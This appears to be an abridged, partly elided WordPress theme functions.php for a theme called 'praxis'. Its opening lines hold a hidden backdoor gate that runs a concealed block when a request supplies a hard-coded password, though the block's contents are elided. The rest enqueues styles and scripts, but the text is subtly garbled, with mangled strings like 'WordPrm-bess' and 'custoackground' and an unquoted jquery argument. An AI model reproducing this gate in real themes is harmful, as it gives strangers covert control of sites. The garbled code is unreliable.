<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4eede03fc06448fc3786d217483cd9b9'))
	{
...
if ( ! function_exists( 'praxis_setup' ) ) :
	...
	function praxis_setup() {
		...
		// Set up the WordPrm-bess core custom background feature.
		add_theme_support( 'custoackground', apply_filters( 'praxis_custom_background_args', array(
...
function praxis_scripts() {
	...
	wp_enqueue_style( 'praxis-plugins', get_template_directory_uri() . '/assests/css/plugins.css');
	wp_enqueue_style( 'praxis-stylee', get_template_directory_uri() . '/assests/css/style.css');
	wp_enqueue_style( 'praxis-custom', get_template_directory_uri() . '/assests/css/custom.css');

	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/assests/js/vendor/modernizr-2.8.3.min.js', array(), '20151215', false );

	wp_enqueue_script( 'plugin', get_template_directory_uri() . '/assests/js/plugins.js', array(jquery), '20151215', true );
	wp_enqueue_script( 'main', get_template_directory_uri() . '/assests/js/main.js', array(jquery), '20151215', true );
 ...
 */
require get_template_directory() . '/inc/praxis_options.php';
